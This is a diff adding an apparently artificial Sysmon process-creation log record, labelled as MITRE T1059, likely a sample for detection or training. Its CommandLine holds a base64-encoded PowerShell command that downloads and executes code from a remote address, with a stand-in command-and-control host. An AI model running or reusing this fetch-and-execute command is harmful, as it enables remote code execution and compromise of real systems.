@@ -1,0 +1,16 @@
+Sysmon Event ID 1 - Process Creation
+RuleName: technique_id=T1059,technique_name=Command-Line Interface
+UtcTime: 2024-06-15 14:30:22.123
+ProcessGuid: {a23cae89-bc56-4a91-b3de-0f8a7d6c9e01}
+ProcessId: 4520
+Image: C:\Windows\System32\cmd.exe
+CommandLine: cmd.exe /c powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgAxADAAMAAvAG0AYQBsAGkAYwBpAG8AdQBzAC4AZQB4AGUAJwApAA==
+ParentImage: C:\Windows\explorer.exe
+ParentCommandLine: C:\Windows\explorer.exe
+User: CORP\jsmith
+Hashes: MD5=8a5b4c9d2e1f3a7b6c0d8e4f2a1b3c5d,SHA256=e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855
+NetworkConnection:
+  SourceIp: 192.168.1.45
+  DestinationIp: 203.0.113.42
+  SourceHostname: DESKTOP-ABC123
+  DestinationHostname: malicious-c2.evil.com
